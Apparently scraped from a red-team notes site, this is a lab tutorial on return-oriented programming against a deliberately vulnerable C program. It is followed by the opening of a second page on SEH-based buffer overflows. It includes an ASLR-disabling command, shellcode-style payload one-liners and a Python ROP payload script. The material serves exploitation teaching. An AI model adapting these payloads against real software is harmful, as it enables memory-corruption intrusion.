# ROP Chaining: Return Oriented Programming | Red Team Notes

![Page cover](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mb8Hunms0j3kQH0p6V8%252F-Mb8ZrXUspRc3P9YGIez%252Frop-chain-exploit-with-popret.gif%3Falt%3Dmedia%26token%3D6e8843e7-27b6-43c2-851e-55c02764787b&width=1248&dpr=4&quality=100&sign=2cf44130&sv=2)

The purpose of this lab is to familiarize with a binary exploitation technique called Return Oriented Programming (ROP), ROP chains / ROP gadgets. The technique is used to bypass Data Execution Protection (DEP).

Don't forget to disable the ASLR for this lab to work:

Copy

    echo 0 > /proc/sys/kernel/randomize_va_space

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#id-1st-rop-chain)

1st ROP Chain


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#vulnerable-code)

Vulnerable Code

We wil exploit the following code in a program `rop1a` that is intentionally vulnerable with a classic stack-based overflow:

rop1a.c

Copy

    #include <stdio.h>
    #include <string.h>
    
    void rop1() 
    {
        printf("ROP 1!\n");
    }
    
    void rop2() {
        printf("ROP 2!\n");
    }
    
    void rop3() {
        printf("ROP 3!\n");
    }
    
    void vulnerable(char* string) 
    {
        char buffer[100];
        strcpy(buffer, string);
    }
    
    int main(int argc, char** argv) 
    {
        vulnerable(argv[1]);
        return 0;
    }

The above program starts executing at `main()`, which calls `vulnerable()` where the user supplied buffer will be copied into the variable `buffer[100]`.

Note that there are 3 functions `rop1`, `rop2` and `rop3` that are never called during the normal program execution, but that's about to change and this is the purpose of this lab - we're going to exploit the stack-based overflow and force the program to call all those rop functions one after another.

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#objective)

Objective

We're going to exploit the classic stack-based overflow vulnerability in the function `vulnerable` in the above code to trigger the functions `rop1()`, `rop2()` and `rop3()` sequentially, that are otherwise not called during the vulnerable program's runtime. Additionally, after the `rop3()` function completes, we will make the program call the libc function `exit()`, so that after the exploit completes its job, the program exits gracefully rather than with a crash.

The sequence of called functions `rop1() --> rop2() --> rop3() --> exit()` forms a chain and this is where the term ROP chains come from.

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#stack-layout)

Stack Layout

The key thing to understand with ROP chaining is the stack layout. In our case, the payload that we send to the vulnerable program needs to overflow the stack and populate it in such a way, that the exploited program calls our wanted functions in the following order:

1.  `rop1()`
    
2.  `rop2()`
    
3.  `rop3()`
    
4.  `exit()`
    

In other words, we need to ensure that the stack in our vulnerable program `rop1a`, when the `vulnerable` function completes and is about to execute the `ret` instruction to return to the caller function `main`, is organized like this:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Me6KFbb12e2jzW1fcUM%252F-Me6KYaayNFaBqGoR_CX%252Fimage.png%3Falt%3Dmedia%26token%3De5d907b3-3397-46d7-945f-222329a1b789&width=768&dpr=4&quality=100&sign=f8cd6ce5&sv=2)

We need to make sure the overflowed stack looks like this

If we think about the above graphic, we will realize that once the stack is overflowed, the following will happen when the vulnerable program continues its execution:

1.  The `vulnerable` function will return/jump to the `rop1()`. Note that before we overflowed the stack, this would have been a return address back to the `main` function, to be precise - the `return 0` statement in line 26 as seen in the [Vulnerable Code](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#vulnerable-code)
     secion;
    
2.  Once `rop1()` completes, it will execute the `ret` instruction, which will pop the `rop2()` function address off the stack and jump to it;
    
3.  Once `rop2()` completes, it will execute the `ret` instruction, which will pop the `rop3()` function address off the stack and jump to it;
    
4.  Once `rop3()` completes, it will execute the `ret` instruction, which will pop the `exit()` function address off the stack and jump to it;
    

We will later confirm this with gdb in the [Inspecting the Stack](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#inspecting-the-stack)
 section.

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#payload)

Payload

Based on the above graphic and stack understanding so far, our payload should look something like this:

Copy

    payload = AAAAs... + BBBB + &rop1 + &rop2 + &rop3 + &exit

...or for easier cross-reference - using the same colours as those seen in the above stack layout diagram:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MeFiTlirTX3m5BH8ZEi%252F-MeFiih5cWrARosj4qs8%252Fimage.png%3Falt%3Dmedia%26token%3Dbd6723c7-e557-41ec-b3c3-c28aff4ea831&width=768&dpr=4&quality=100&sign=87ffc46b&sv=2)

Payload structure visualized

Let's find out the values we need to populate our payload with. Compile our vulnerable program `rop1a`:

Copy

    gcc -m32 -fno-stack-protector -z execstack rop1a.c -o rop1a

Start debugging it with [gdb-peda](https://github.com/longld/peda)
 and put a breakpoint on `main()` and continue execution:

Copy

    gdb rop1a
    b main
    c

Now, let's find out addresses for our functions `rop1`, `rop2`, `rop3` and `exit`:

Copy

    gdb-peda$ p rop1
    $1 = {<text variable, no debug info>} 0x565561a9 <rop1>
    
    gdb-peda$ p rop2
    $2 = {<text variable, no debug info>} 0x565561d4 <rop2>
    
    gdb-peda$ p rop3
    $3 = {<text variable, no debug info>} 0x565561ff <rop3>
    
    gdb-peda$ p exit
    $4 = {<text variable, no debug info>} 0xf7e02950 <exit>

Below shows the function addresses in gdb:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mb29PdBSfE1vUKDA5iE%252F-Mb31CmMnPjEExI7eQNu%252Fimage.png%3Falt%3Dmedia%26token%3D45326332-b834-4e38-af09-17da659a5310&width=768&dpr=4&quality=100&sign=1dba0b0c&sv=2)

Key function addresses to be used in the payload

Having found the function addreses, our payload visualization can now be updated like this:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MeFhvbsXEq878zUvyo5%252F-MeFiAOQAZD36DVLSqxV%252Fimage.png%3Falt%3Dmedia%26token%3D670d2cad-3017-4240-bb61-b38c30c88637&width=768&dpr=4&quality=100&sign=489441dd&sv=2)

Payload structure with ROP function addresses

The last thing we need to know is how many AAAAs we must send in to the `vulnerable` program before we can take over the EIP and overwrite the return address of the `vulnerable` function and point it to our first ROP chain function - `rop1`.

Below screenshot indicates that the offset of interest is 112 (0x70), or in other words, we need to send 112 A characters to smash the stack:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mb29PdBSfE1vUKDA5iE%252F-Mb3DDBtnV4rOvbnEQes%252Fimage.png%3Falt%3Dmedia%26token%3De0c500fb-adae-4cd1-8664-de7e0634616c&width=768&dpr=4&quality=100&sign=5570d414&sv=2)

EIP offset

See below notes for more details on how to find the offset at which we can overwrite the `vulnerable` function's return address:

[32-bit Stack-based Buffer Overflow](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/stack-based-buffer-overflow)

Knowing the EIP offset, we can now now visualize the full payload like this:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MeFiTlirTX3m5BH8ZEi%252F-MeFjA-s1gpKQLkCKpGu%252Fimage.png%3Falt%3Dmedia%26token%3D79aa783d-17c7-4b37-8206-0060e1955bc1&width=768&dpr=4&quality=100&sign=4b5ef556&sv=2)

Payload structure with correct EIP offset and ROP function addresses

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#exploit)

Exploit

We can now construct the full payload in python and send it to our vulnerable program `rop1a` like this:

Copy

    ./rop1a "$(python -c 'print "A"*108 + "BBBB" + "\xa9\x61\x55\x56" + "\xd4\x61\x55\x56" + "\xff\x61\x55\x56" +  "\x50\x29\xe0\xf7"')"

If we execute it, we can see that`rop1`, `rop2` and `rop3` functions are called successfully as they each call their respective `printf()` statements:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mb29PdBSfE1vUKDA5iE%252F-Mb3FeapAizXUMECkoDW%252Frop-chain-exploit.gif%3Falt%3Dmedia%26token%3Da69cc076-fed0-415f-aa4a-f04b2d91889b&width=768&dpr=4&quality=100&sign=e037be35&sv=2)

1st ROP chain in action

Note how the program did not crash with some segfault - this is because `rop3` called `exit` upon return. To re-inforce this understanding, we will see how that came to be in the below section.

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#inspecting-the-stack-layout)

Inspecting the Stack Layout

Let's explore the stack layout of the vulnerable program `rop1a` when the `vulnerable()` function gets exploited and is about to return after it completes executing - when the CPU is about to execute the `ret` instruction.

Below screenshot shows the initial diagram on the left, indicating how we needed the stack to look like during the exploitation and gdb screenshots on the right, that confirm we successfully built the required stack:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Me6KFbb12e2jzW1fcUM%252F-Me6McuujFXfLVCdFoRp%252Fimage.png%3Falt%3Dmedia%26token%3D108713ce-98ad-4389-8b98-81e3ff45a357&width=768&dpr=4&quality=100&sign=f23232eb&sv=2)

Stack layout during vulnerable function's execution

From the above screenshot, note the following key points:

1.  `vulnerable()` function is about to execute the `ret` instruction at `0x56556254`;
    
2.  `ret` instruction will pop the top-most value from the stack, which is a memory address of the `rop1()` function and jump to it, this way kicking off our ROP chain execution.
    

Next, once `rop1()` is about to return, the `ret` instruction will pop the top-most value from the stack, which is a memory location of `rop2()` and jump to it:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mb3IVQQsM1DqqOyBuki%252F-Mb8BWJ9D3ivDyeFVQgC%252Fimage.png%3Falt%3Dmedia%26token%3D47b496e4-792f-4d7e-a6f7-f7513a2c8c8b&width=768&dpr=4&quality=100&sign=a2624759&sv=2)

rop1 is about to return, pop the rop2 address from the stack and jump to it

Once `rop2()` is about to return, the `ret` instruction will pop the top-most value from the stack, which is a memory location of `rop3()` and jump to it:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mb3IVQQsM1DqqOyBuki%252F-Mb8BrV9Aq6FL8XoXTdY%252Fimage.png%3Falt%3Dmedia%26token%3D5e9c5c23-b3a8-480c-a737-ceb248221e1b&width=768&dpr=4&quality=100&sign=ba0d5c04&sv=2)

rop2 is about to return, pop the rop3 address from the stack and jump to it

Once `rop3()` is about to return, the `ret` instruction will pop the top-most value from the stack, which is a memory location of `exit()` and jump to it:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mb3IVQQsM1DqqOyBuki%252F-Mb8CJXa60K96Xfuiu70%252Fimage.png%3Falt%3Dmedia%26token%3Dab69a054-55f3-442d-8a37-dc5720335fe7&width=768&dpr=4&quality=100&sign=b83a04a&sv=2)

rop3 is about to return, pop the exit address from the stack and jump to it

This illustrates how we managed to build our first ROP chain by organizing the stack in such a way that forced the vulnerable program to call `rop1`, which upon return called `rop2`, which upon return called `rop3`, which upon return called `exit`:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mb29PdBSfE1vUKDA5iE%252F-Mb3FeapAizXUMECkoDW%252Frop-chain-exploit.gif%3Falt%3Dmedia%26token%3Da69cc076-fed0-415f-aa4a-f04b2d91889b&width=768&dpr=4&quality=100&sign=e037be35&sv=2)

1st ROP chain in action

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#id-2nd-rop-chain)

2nd ROP Chain


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Our first ROP chain called 4 functions and none of them were called with arguments. Let's build our second ROP chain that will call functions with some arguments and see how we need to build the stack this time around.

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#vulnerable-code-1)

Vulnerable Code

We're going to re-use the same code, but modify it so that `rop2` and `rop3` functions will take 1 and 2 arguments respectively and will print them out accordingly when called:

rop1b.c

Copy

    #include <stdio.h>
    #include <string.h>
    
    void rop1() {
        printf("ROP 1!\n");
    }
    
    void rop2(int a) {
        printf("ROP 2: %x!\n", a);
    }
    
    void rop3(int a, int b) {
        printf("ROP 3: %x, %x!\n", a, b);
    }
    
    void vulnerable(char* string) {
        char buffer[100];
        strcpy(buffer, string);
    }
    
    int main(int argc, char** argv) {
        vulnerable(argv[1]);
        return 0;
    }

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#objective-1)

Objective

The objective is to subvert our vulnerable program `rop1b` and make it call functions `rop1`, `rop2`, `rop3` and `exit` the same way we did it with our first ROP chain, however, this time `rop2` function is declared as `rop2(int a)` and `rop3` as `rop3(int a, int b)`, meaning we will have to somehow (hint: using stack) pass 1 argument to `rop2` and 2 arguments to `rop3`.

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#stack-layout-1)

Stack Layout

Below shows what the stack needs to look like this time. Annotations explain the purpose of each memory address or value on the stack:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Me6KFbb12e2jzW1fcUM%252F-Me6N03HxfivnVlXvDsO%252Fimage.png%3Falt%3Dmedia%26token%3D415212b5-7a8f-405b-bdcf-a3875b2878f8&width=768&dpr=4&quality=100&sign=1a795513&sv=2)

Required stack layout for our 2nd ROP chain

To re-inforce, stack for our second ROP chain has the following key differences when compared to the stack of the first ROP chain:

1.  Stack contains arguments for functions `rop2` and `rop3`;
    
2.  Stack contains 2 additional memory addresses, called ROP gadgets:
    
    1.  `pop ret` - for popping off the `arg1` argument that was passed to `rop2` function and then jumping to `rop3` (because `ret` instruction will pop the `rop3` address off the stack that will be at the top once the `arg1` is removed from the stack, and jump to it);
        
    2.  `pop pop ret` - for popping off the 2 arguments `arg1` and `arg2` (hence 2 pops) that were passed to the `rop3` function and then jumpt to `exit` (because `ret` instruction will pop the `exit` address off the top of the stack that will be there after the 2 arguments are removed).
        
    

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#rop-gadgets)

ROP Gadgets

*   ROP gadgets are sequences of CPU instructions that are already present in the program being exploited or its loaded shared libraries and can be used to execute almost any arbitrary code;
    
*   ROP gagdgets most often end with the `ret` instruction;
    
*   ROP gadgets bypass the DEP (NX bit protection), since there is no executable code being injected to and executed from the stack, instead existing executable code is used to achieve the same malicious intent.
    

In gdb-peda, we can find addresses of the 2 gadgets that we are interested in (`popret` for `rop2` and `pop2ret` for `rop3`) by issuing the `ropgadet` command:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mb8Hunms0j3kQH0p6V8%252F-Mb8ZcGJI677JEQ52Tl-%252Fimage.png%3Falt%3Dmedia%26token%3D789427da-4bc5-48bb-a9b6-e106637e1766&width=768&dpr=4&quality=100&sign=1b90413c&sv=2)

ropgadgets in rop1b vulnerable program

Copy

    gdb-peda$ ropgadget 
    ret = 0x5655600a
    popret = 0x5655601e
    pop2ret = 0x5655630a
    pop3ret = 0x56556309
    pop4ret = 0x56556308
    addesp_12 = 0x5655601b
    addesp_16 = 0x565560fe

To confirm that the rop gadget does what it says it will, we can inspect the instructions for the rop gadget `popret = 0x5655601e` and we will see that it indeed contains 2 CPU instrutions `pop ebx & ret`:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mb8dAFiHM87nXkjOg2u%252F-Mb8eVa40c8TAKEzNjEi%252Fimage.png%3Falt%3Dmedia%26token%3Df08d93cb-921d-453f-8e29-f4a0d8bd0dc6&width=768&dpr=4&quality=100&sign=f145a295&sv=2)

popret ROP gadget instructions

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#payload-1)

Payload

Now that we know how the stack should look like, let's build the payload for our second ROP chain.

First off, let's get addresses of our `rop1`, `rop2`, `rop3` and the libc `exit` functions:

Copy

    gdb-peda$ p rop1
    $4 = {<text variable, no debug info>} 0x565561b9 <rop1>
    gdb-peda$ p rop2
    $5 = {<text variable, no debug info>} 0x565561e4 <rop2>
    gdb-peda$ p rop3
    $6 = {<text variable, no debug info>} 0x56556212 <rop3>
    gdb-peda$ p exit
    $7 = {<text variable, no debug info>} 0xf7e02950 <exit>

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MbAyCcQAz23TDDYnVNb%252F-MbDLsP5hjrkcv4ygs-F%252Fimage.png%3Falt%3Dmedia%26token%3D9fc9e791-ddca-4b82-8494-cbc695c15e81&width=768&dpr=4&quality=100&sign=8e46583&sv=2)

rop1, rop2, rop3 and exit function addresses inside rop1b vulnerable program

Let's also note the `popret` and `pop2ret` gagdet addresses:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MbAyCcQAz23TDDYnVNb%252F-MbDMKoDUBEZBQmbOuPf%252Fimage.png%3Falt%3Dmedia%26token%3Daa10fa17-43f0-4a6c-a154-edb315df6ff7&width=768&dpr=4&quality=100&sign=1473d4ea&sv=2)

ROP gadget addresses for rop1b vulnerable program

Since we now know how the stack needs to look like and we have addresses for our functions and ROP gadgets, we can visualize our payload like this:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Me6KFbb12e2jzW1fcUM%252F-Me6WX4FD6vcIt2DeXGN%252Fimage.png%3Falt%3Dmedia%26token%3Dba2c4980-cf87-410b-b007-a6aa51649d98&width=768&dpr=4&quality=100&sign=7d2996a5&sv=2)

Visualized payload for the 2nd ROP chain

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#exploit-1)

Exploit

We can now translate the above visualized payload to python like so:

Copy

    ./rop1b "$(python -c 'print "A"*108 + "BBBB" + "\xb9\x61\x55\x56" + "\xe4\x61\x55\x56" + "\x1e\x60\x55\x56" + "\xef\xbe\xef\xbe" + "\x12\x62\x55\x56" + "\x0a\x63\x55\x56" + "\xad\xde\xad\xde" + "\xd3\xc0\xd3\xc0" + "\x50\x29\xe0\xf7" ')"

Below shows how the above payload is sent to the vulnerable program `rop1b`, that executes `rop1`, `rop2` with argument `0xbeefbeef` that gets printed out and `rop3` with 2 arguments `0xdeaddead` and `0xc0d3cod3` which too get printed and finally gracefully exits:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Mb8Hunms0j3kQH0p6V8%252F-Mb8ZrXUspRc3P9YGIez%252Frop-chain-exploit-with-popret.gif%3Falt%3Dmedia%26token%3D6e8843e7-27b6-43c2-851e-55c02764787b&width=768&dpr=4&quality=100&sign=2cf44130&sv=2)

2nd ROP chain with arguments and rop gadgets works as expected

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#inspecting-the-stack-layout-1)

Inspecting the Stack Layout

To avoid repeating what we saw in the [Stack Layout](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#stack-layout)
 section for our first ROP chain, let's just see how the `pop2ret` ROP gadget works and how it affects the stack during execution, since that is the only difference worth mentioning:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MbDU4ewhTzXkSVE4kUE%252F-MbDrlZxb1bhBaJo7NjH%252Fpop-pop-ret-inspection.gif%3Falt%3Dmedia%26token%3D6875581a-b7bb-4ee9-8f5a-1068e81698fc&width=768&dpr=4&quality=100&sign=b00370cd&sv=2)

Inspecting the stack layout

Note the following key points from the above gif:

*   We're on a breakpoint inside the `rop3` function, where it's about to return by executing the `ret` instruction;
    
*   At the top of the stack, there's an address of a `pop2ret` ROP gadget with `pop edi; pop ebp; ret` instructions inside a libc shared library loaded by our vulnerable program;
    
*   `0xdeaddead` and `0xc0d3c0d3` are on the stop of the stack, just below the `pop2ret` address;
    
*   Once the `ret` is executed, the code jumps to the said `pop2ret` ROP gagdet;
    
*   `pop2ret` instructions `pop edi; pop ebp` execute and `0xdeaddead` and `0xc0d3c0d3` are popped from the stack;
    
*   Address of the libc `exit()` function is now on top of the stack;
    
*   Finally, `ret` instruction executes, which pops the `exit()` address from the stack and jumps to it, completing our second ROP chain execution and gracefully closing the vulnerable program.
    

We could have chosen to inspect the `popret` gadget and we would have seen a nearly identical behaviour to the one noted above, except that `popret` would have popped only one value from the stack before executing the `ret` instruction.

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#useful-python)

Useful Python


---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#little-endian-converter)

Little Endian Converter

Below is a useful python snippet that converts a given memory address, i.e `0x565561d4`, to it's little-endian format, i.e `\\xd4\\x61\\x55\\x56`:

Copy

    import struct
    '\\x' + '\\x'.join(x.encode('hex') for x in struct.pack('I', 0x565561d4)).encode("utf-8")
    '\\xd4\\x61\\x55\\x56'

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#payload-executor)

Payload Executor

Below shows an easy way to build the stack using `struct.pack` that does not require us to deal with little-endiannes when specifying memory addresses in the exploit:

Copy

    #!/usr/bin/env python
    import os
    import struct
    
    pop_ret = 0x5655601e
    pop_pop_ret = 0x5655630a
    rop1 = 0x565561b9
    rop2 = 0x565561e4
    rop3 = 0x56556212
    exit = 0xf7e02950
    
    # Build the stack
    # Overflow
    payload =  "A"*108
    payload += "BBBB"
    
    # Address of rop1()
    payload += struct.pack("I", rop1)
    
    # Address of rop2(), address of pop ret and an argument for rop2()
    payload += struct.pack("I", rop2)
    payload += struct.pack("I", pop_ret)
    payload += struct.pack("I", 0xbeefbeef)
    
    # Address of rop3(), adress of pop pop ret, and arguments 1 and 2
    payload += struct.pack("I", rop3)
    payload += struct.pack("I", pop_pop_ret)
    payload += struct.pack("I", 0xdeaddead)
    payload += struct.pack("I", 0xc0dec0de)
    
    # Address of exit()
    payload += struct.pack("I", exit)
    
    # Execute the full payload
    os.system("./rop1b '" + payload + "'")

Once the payload is constructed, we can execute it:

Copy

    python payload.py

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-Me6KFbb12e2jzW1fcUM%252F-Me6Y3_F33vR7YgOltH2%252Fimage.png%3Falt%3Dmedia%26token%3D3f700183-06c9-4f4f-815e-c640e7068d87&width=768&dpr=4&quality=100&sign=24a44b50&sv=2)

ROP chains executed successfully

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#references)

# SEH Based Buffer Overflow | Red Team Notes

The purpose of this lab is to familiarize how Structured Exception Handler / SEH based buffer overflow exploits work.

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow#seh-101)

SEH 101


------------------------------------------------------------------------------------------------------------------------------------------------

*   Structured exception handling (SEH) is simply code in a program that is meant to handle situations when program throws an exception due to a hardware or software issue. This means catching those situations and doing something to resolve them;
    
*   SEH code is located on the program's stack for each `try-catch` code block and each handler has its own stack frame;
    
*   SEH is stored in stack as `EXCEPTION_REGISTRATION_RECORD` memory structure (also called SEH record) consisting of two 4 byte fields:
    
    *   pointer to the next SEH record within the SEH chain;
        
    *   pointer to the exception handler code - the `catch` part of the code block. This is the code that attempts to resolve the exception that the program threw;
        
    
*   A program may have multiple SEHs registered that are connected by a linked list, forming a SEH chain;
    
    *   Once a program throws an exception, the OS runs through the SEH chain and attempts to find an appropriate exception handler;
        
    *   If no suitable handler is found, a default OS handler is used from the bottom of the SEH chain. All SEH chains always end with a default Windows SEH record. Next SEH Record field point to`FFFFFFFF`, which mean's that this is the last SEH record in the chain;
        
    
*   SEH chain is stored in the Thread Environment Block (TEB) memory structure in its first member called Thread Information Block (TIB), that can be accessed via FS segment register `FS:[0x00]`;
    
*   64-bit applications are not vulnerable to SEH overflow as binaries are linked with safe exception handlers embedded in the PE file itself;
    
*   32-bit applications can be linked with `/SAFESEH` flag, which will produce a PE file with a table of safe exception handlers, assuming all modules are compatible with safe execption handling feature.
    

Below is a simplified diagram visualising some of the key points outlined above:

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MeWmTwREZyQXFxEnI6w%252F-MeaUbJZAg42UBO09ZNR%252Fimage.png%3Falt%3Dmedia%26token%3D77a31756-4d3d-4631-b87b-ff4828f7ef70&width=768&dpr=4&quality=100&sign=54a8f6c0&sv=2)

TEB, SEH Chains, SEH Records visualised

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow#exploring-teb-tib-seh-chains)

Exploring TEB / TIB / SEH Chains


----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### 

[](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow#memory-structures)

Memory Structures

Let's explore the key structures around SEH using WinDBG and confirm the key points mentioned in the SEH 101 section.

Thread Environment Block is a described in the OS as `_TEB` memory structure and can be inspected in WinDBG like so:

Copy

    dt _teb

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MeWmTwREZyQXFxEnI6w%252F-Mea_0KoEU0IhF1IUinO%252Fimage.png%3Falt%3Dmedia%26token%3D16c212e2-aea8-450c-ab0a-69d51fd0cd62&width=768&dpr=4&quality=100&sign=7a2e0074&sv=2)

Snippet of the \_TEB memory structure

As seen from the above screenshot, the TEB's first member is `_NT_TIB` (Thread Information Block) memory structure, which can be inspected like so:

Copy

    dt _NT_TIB

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-MeWmTwREZyQXFxEnI6w%252F-Mea_yGYGnNYfLX0tVCZ%252Fimage.png%3Falt%3Dmedia%26token%3D10eaa3c2-2ecf-4846-9c1a-3b98315edb87&width=768&dpr=4&quality=100&sign=78597ef4&sv=2)

TIB memory structure in WinDBG

